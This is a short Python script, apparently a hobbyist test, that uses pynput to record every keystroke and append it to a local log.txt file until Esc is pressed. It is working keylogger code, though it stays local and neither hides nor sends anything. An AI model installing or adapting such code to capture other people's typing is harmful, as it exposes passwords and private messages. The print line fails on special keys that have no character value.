'''
Author: locchuong
Updated: 27/12/21
Description:
	Test key logging, export as a log.txt file
'''
import pynput 
from pynput.keyboard import Key,Listener

count = 0 
keys = []

def on_press(key):
	global keys,count
	keys.append(key)
	count +=1 
	print("{0} pressed".format(key.char))
	#if key.char == 'a':
	#	print("Yesssss....")
	#if key == Key.up:
	#	print("Uppppp.....")
	# if count exceeded init value then write everything on keys list into log.txt
	if count >= 10: 
		count = 0 # reset count
		write_file(keys)
		keys = [] # reset keys

def on_release(key):
	if key == Key.esc:
		return False # Return false will break the loop

def write_file(keys):
	'''
	If you use 'w' meaning write mode, it will create a log.txt file if you don't have one
	If you use 'a' meaning append mode, it will append log.txt 's content  
	'''
	with open("log.txt","a") as f:
		for key in keys:
			key = str(key)
			key = key.replace("'","")
			if key.find("space") > 0:
				f.write('\n')
			elif key.find("Key") == -1:
				f.write(key) # write everything in the keys list

with Listener(on_press = on_press, on_release = on_release) as listener:
	listener.join()